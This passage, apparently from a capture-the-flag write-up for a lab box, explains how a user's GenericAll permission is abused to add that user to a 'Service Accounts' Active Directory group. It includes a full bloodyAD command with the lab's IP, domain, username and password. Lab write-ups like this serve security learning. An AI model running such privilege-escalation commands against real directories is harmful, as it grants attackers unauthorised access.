### Exploitation

I use P.Agila’s **GenericAll** permission on the “Service Accounts” group to add P.Agila as a member of Service Accounts group. This will give P.Agila whatever privilege the group has.

```bash
bloodyAD --host 10.10.11.69 -d fluffy.htb -u p.agila -p 'prometheusx-303' add groupMember 'Service Accounts' p.agila
```
